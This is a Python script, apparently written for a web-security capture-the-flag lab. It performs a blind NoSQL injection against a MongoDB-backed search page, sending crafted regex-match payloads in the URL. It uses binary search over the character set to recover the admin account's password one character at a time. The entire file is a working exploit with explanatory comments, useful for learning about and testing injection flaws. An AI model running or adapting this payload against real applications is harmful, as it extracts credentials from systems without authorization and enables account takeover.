#!/Users/kelseytroeger/webSecCTF/env/bin/python3

import requests
import sys
import re
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from bs4 import BeautifulSoup

"""Check that the user supplied an IP or web address. Syntax should be [python3 Mongodbhack.py localhost:8000]"""
if len(sys.argv) != 2:
  print("Too few arguments")
  sys.exit()

# Initialization
address = sys.argv[1]
ret_str = passchars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
flag = 0
ret_char = "" 
password = ""

"""Function takes the string of possible characters and splits it in half to use it for binary search in makeguess_wrap"""
def split (passchars) :
  half = len(passchars)//2
  left = passchars[0:half]
  right = passchars[half:]
  return (left, right) 

"""The bulk of the recursive function. Injects the string argument into a url and submits it to the website. Returns the string used if successful, zero if not"""
def makeguess (half_str, password) :
  global flag
  url = "http://"+ address +"/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(/^"+password+"%5B"+half_str+"%5D/)//+%00"

  #Makes sure the website doesn't get overloaded and cut the connection
  session = requests.Session()
  retry = Retry(connect=3, backoff_factor=0.5)
  adapter = HTTPAdapter(max_retries=retry)
  r = session.get(url)
  if r.status_code != 200 :
    print("Bad HTTP request")
    sys.exit()
    
  soup = BeautifulSoup(r.content, 'html.parser')
  #Checks the parsed website data for the returned user, in this case "admin." This means the next letter of the password is withinthe string it guessed
  if soup.body.findAll(text=re.compile('^admin$')) :
    #If the website returns the admin account and there's only one password letter being guessed, we know this is the next letter in the password. The flag is set to exit recursion.
    if len(half_str) == 1 :
      flag = 1
    # Return the string that contains the letter
    return half_str
  else :
    # Return null if the string is the wrong one
    return ""

"""Wrapper for makeguess function. Splits the string in half and tests the left half of the string to see if it gets a match. Tests the right half if not """
def makeguess_wrap (passchars, password) :
  global ret_str
  global flag
  # Signals that it didn't find a character despite searching the entire string. So the password is complete. Return null
  if len(passchars) == 1 and flag == 0 :
    return ""
  # Signals that the correct character was found, so it resets the flag to 0 because it's served its function
  if flag == 1:
    flag = 0
    return ret_str

  # Splits the characters in half to check one half at a time
  left, right = split(passchars)

  ret_str = makeguess(left, password)
  # Does the left side of the string contain the password character?
  if ret_str :
    return makeguess_wrap(left, password)
  # If the left didn't work, it has to be in the right side
  else :
    ret_str = makeguess(right, password)
    return makeguess_wrap(right, password)

# Main
while True :
  ret_str = passchars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
  ret_char = makeguess_wrap(passchars, password)
  print("Returned character: ", ret_char)
  password = password + ret_char
  print("Password so far: ", password)
  if not ret_char :
    break

print("The password is: ", password)
sys.exit()
